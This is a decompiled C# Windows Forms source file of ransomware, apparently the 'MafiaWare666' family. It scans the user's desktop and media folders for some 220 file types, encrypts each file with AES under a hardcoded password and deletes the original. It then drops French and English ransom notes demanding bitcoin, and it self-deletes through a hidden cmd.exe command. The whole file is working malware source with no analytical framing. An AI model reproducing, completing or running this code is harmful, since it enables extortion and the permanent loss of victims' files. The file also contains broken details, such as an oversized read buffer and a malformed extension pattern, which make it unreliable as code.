using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Plutus.Properties;

namespace Plutus;

public class pluto : Form
{
	private List<string> filesToLock = new List<string>();

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string password = "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206";

	private IContainer components = null;

	private PictureBox pictureBox1;

	private TextBox keyBox;

	private Button button1;

	private Label label1;

	private Button button2;

	private Label label8;

	private Label label7;

	private Button button3;

	public pluto()
	{
		string[] array = new string[220]
		{
			"*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpeg", "*.png",
			"*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd",
			"*.sql", "*.mp4", "*.7z", "*.rar", "*.m4a", "*.wma", "*.avi", "*.wmv", "*.csv", "*.d3dbsp",
			"*.zip", "*.sie", "*.sum", "*.ibank", "*.t13", "*.t12", "*.qdf", "*.gdb", "*.tax", "*.pkpass",
			"*.bc6", "*.bc7", "*.bkp", "*.qic", "*.bkf", "*.sidn", "*.sidd", "*.mddata", "*.itl", "*.itdb",
			"*.icxs", "*.hvpl", "*.hplg", "*.hkdb", "*.mdbackup", "*.syncdb", "*.gho", "*.cas", "*.svg", "*.map",
			"*.wmo", "*.itm", "*.sb", "*.fos", "*.mov", "*.vdf", "*.ztmp", "*.sis", "*.sid", "*.ncf",
			"*.menu", "*.layout", "*.dmp", "*.blob", "*.esm", "*.vcf", "*.vtf", "*.dazip", "*.fpk", "*.mlx",
			"*.kf", "*.iwd", "*.vpk", "*.tor", "*.psk", "*.rim", "*.w3x", "*.fsh", "*.ntl", "*.arch00",
			"*.lvl", "*.snx", "*.cfr", "*.ff", "*.vpp_pc", "*.lrf", "*.m2", "*.mcmeta", "*.vfs0", "*.mpqge",
			"*.kdb", "*.db0", "*.dba", "*.rofl", "*.hkx", "*.bar", "*.upk", "*.das", "*.iwi", "*.litemod",
			"*.asset", "*.forge", "*.ltx", "*.bsa", "*.apk", "*.re4", "*.sav", "*.lbf", "*.slm", "*.bik",
			"*.epk", "*.rgss3a", "*.pak", "*.big", "*.wallet", "*.wotreplay", "*.xxx", "*.desc", "*.py", "*.m3u",
			"*.flv", "*.js", "*.css", "*.rb", "*.p7c", "*.pk7", "*.p7b", "*.p12", "*.pfx", "*.pem",
			"*.crt", "*.cer", "*.der", "*.x3f", "*.srw", "*.pef", "*.ptx", "*.r3d", "*.rw2", "*.rwl",
			"*.raw", "*.raf", "*.orf", "*.nrw", "*.mrwref", "*.mef", "*.erf", "*.kdc", "*.dcr", ".cr2",
			"*.crw", "*.bay", "*.sr2", "*.srf", "*.arw", "*.3fr", "*.dng", "*.jpe", "*.jpg", "*.cdr",
			"*.indd", "*.ai", "*.eps", "*.pdf", "*.pdd", "*.dbf", "*.mdf", "*.wb2", "*.rtf", "*.wpd",
			"*.dxg", ".*xf", "*.dwg", "*.pst", "*.accdb", "*.mdb", "*.pptm", "*.pptx", "*.ppt", "*.xlk",
			"*.xlsb", "*.xlsm", "*.xlsx", "*.xls", "*.wps", "*.docm", "*.docx", "*.doc", "*.odb", "*.odc",
			"*.odm", "*.odp", "*.ods", "*.odt", "*.cs", "*.mpeg", "*.mp3", "*.mkv", "*.divx", "*.ogg",
			"*.zip", "*.wav", "*.bat", "*.index", "*.cpp", "*.hpp", "*.h", "*.c", "*.vb", "*.MafiaWare666"
		};
		string[] array2 = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures)
		}.ToArray();
		Directory.GetLogicalDrives();
		for (int i = 0; i < array2.Length; i++)
		{
			string[] array3 = array;
			foreach (string searchPattern in array3)
			{
				try
				{
					string[] files = Directory.GetFiles(array2[i], searchPattern, SearchOption.AllDirectories);
					string[] directories = Directory.GetDirectories(array2[i], searchPattern, SearchOption.AllDirectories);
					for (int k = 0; k < files.Length; k++)
					{
						if (files[k] != null)
						{
							if (files[k].Contains(".MafiaWare666"))
							{
								filesToLock.Add(files[k]);
								continue;
							}
							filesToLock.Add(files[k]);
							lockFiles(files[k], password);
						}
					}
					for (int l = 0; l < directories.Length; l++)
					{
						if (!directories[l].Contains("Windows") && !directories[l].Contains("Program Files") && !directories[l].Contains("Program Files (x86)"))
						{
							messageCreator();
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		filesToLock.ToArray();
		InitializeComponent();
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\Message.txt";
		string path = userDir + userName + text;
		string[] contents = new string[30]
		{
			"                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ",
			" ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin", "", " 3) lorsque je reçois les bitcoins , je décrypte vos fichiers", "", "", "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path, contents);
		string text2 = "\\Downloads\\Message.txt";
		string path2 = userDir + userName + text2;
		string[] contents2 = new string[30]
		{
			"                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ",
			" ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin", "", " 3) lorsque je reçois les bitcoins , je décrypte vos fichiers", "", "", "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path2, contents2);
		string text3 = "\\Documents\\Message.txt";
		string path3 = userDir + userName + text3;
		string[] contents3 = new string[30]
		{
			"                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ",
			" ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin", "", " 3) lorsque je reçois les bitcoins , je décrypte vos fichiers", "", "", "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path3, contents3);
		string text4 = "\\Pictures\\Message.txt";
		string path4 = userDir + userName + text4;
		string[] contents4 = new string[30]
		{
			"                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ",
			" ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin", "", " 3) lorsque je reçois les bitcoins , je décrypte vos fichiers", "", "", "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path4, contents4);
		string text5 = "\\Music\\Message.txt";
		string path5 = userDir + userName + text5;
		string[] contents5 = new string[30]
		{
			"                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ",
			" ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin", "", " 3) lorsque je reçois les bitcoins , je décrypte vos fichiers", "", "", "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, we will send The decryption Key To Your Email"
		};
		File.WriteAllLines(path5, contents5);
		string text6 = "\\Videos\\Message.txt";
		string path6 = userDir + userName + text6;
		string[] contents6 = new string[30]
		{
			"                        contact:  hakanonymos@hotmail.com ", "", "               I) French Version : ", " ", " Vos fichiers importants  vidéos, musiques, images,documents …etc  sont cryptés avec chiffrement.", "  RSA-2048 et AES-128.Décrypter vos fichiers est uniquement possible à l'aide d'une clé privée et un .", "  programme de décryptage Qui se trouvent sur mon serveur secret ", " Pour décrypter vos fichiers, veuillez suivre les instructions suivantes :  ", " ", " 1) Achetez des bitcoins de 300 €, euros ( 0.05 btc ) ",
			" ", " 2) Envoyez les bitcoins à cette adresse :    votre adresse de bitcoin", "", " 3) lorsque je reçois les bitcoins , je décrypte vos fichiers", "", "", "                         contact:  hakanonymos@hotmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path6, contents6);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)keyBox).get_Text() == password)
		{
			MessageBox.Show("Key accepted, decrpytion will start now. \nJust sit tight, and relax");
			foreach (string item in filesToLock)
			{
				if (item.Contains(".MafiaWare666"))
				{
					unlockFile(item, password);
				}
			}
			MessageBox.Show("Decrypted enjoy your files Thenk you *-*");
			selfDestroy();
		}
		else
		{
			MessageBox.Show("That key was wrong, what to do? \n       - Make sure you've paid \n      - Make sure you've copied the key properly \n      - Contact us asking for help key \n      - Send us proof that you've paid and will send \n        functioning key or decryprion software");
		}
	}

	public void selfDestroy()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C timeout 2 && Del /Q /F " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	[DllImport("KERNEL32.DLL")]
	public static extern bool RtlZeroMemory(IntPtr Destitnation, int length);

	public static byte[] createSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void lockFiles(string inputFiles, string password)
	{
		byte[] array = createSalt();
		FileStream fileStream = new FileStream(inputFiles + ".MafiaWare666", FileMode.Append);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFiles, FileMode.Open);
		byte[] array2 = new byte[91048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			File.Delete(inputFiles);
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	private void unlockFile(string inputFiles, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFiles, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		string path = inputFiles.Replace(".MafiaWare666", "");
		FileStream fileStream2 = new FileStream(path, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			File.Delete(inputFiles);
			fileStream2.Close();
			fileStream.Close();
		}
	}

	private void pluto_Load(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Control)button3).set_Text("Copied");
		Clipboard.SetText(((Control)label7).get_Text());
		Process.Start("https://bitcoin.org/en/buy");
	}

	private void button3_Click(object sender, EventArgs e)
	{
	}

	private void button3_Click_1(object sender, EventArgs e)
	{
		((Control)button3).set_Text("Copied");
		Clipboard.SetText(((Control)label7).get_Text());
		Process.Start("https://translate.google.com");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(pluto));
		keyBox = new TextBox();
		button1 = new Button();
		label1 = new Label();
		button2 = new Button();
		pictureBox1 = new PictureBox();
		label8 = new Label();
		label7 = new Label();
		button3 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(keyBox, "keyBox");
		((Control)keyBox).set_Name("keyBox");
		componentResourceManager.ApplyResources(button1, "button1");
		((Control)button1).set_Name("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		componentResourceManager.ApplyResources(label1, "label1");
		((Control)label1).set_BackColor(Color.Maroon);
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Name("label1");
		componentResourceManager.ApplyResources(button2, "button2");
		((Control)button2).set_Name("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_ErrorImage((Image)(object)Resources.mafia_png_transparent_mafia_images_16792_removebg_preview);
		componentResourceManager.ApplyResources(pictureBox1, "pictureBox1");
		((Control)pictureBox1).set_Name("pictureBox1");
		pictureBox1.set_TabStop(false);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_ForeColor(Color.White);
		componentResourceManager.ApplyResources(label8, "label8");
		((Control)label8).set_Name("label8");
		componentResourceManager.ApplyResources(label7, "label7");
		((Control)label7).set_BackColor(Color.Transparent);
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Name("label7");
		componentResourceManager.ApplyResources(button3, "button3");
		((Control)button3).set_Name("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click_1);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(12, 12, 12));
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)keyBox);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("pluto");
		((Form)this).add_Load((EventHandler)pluto_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
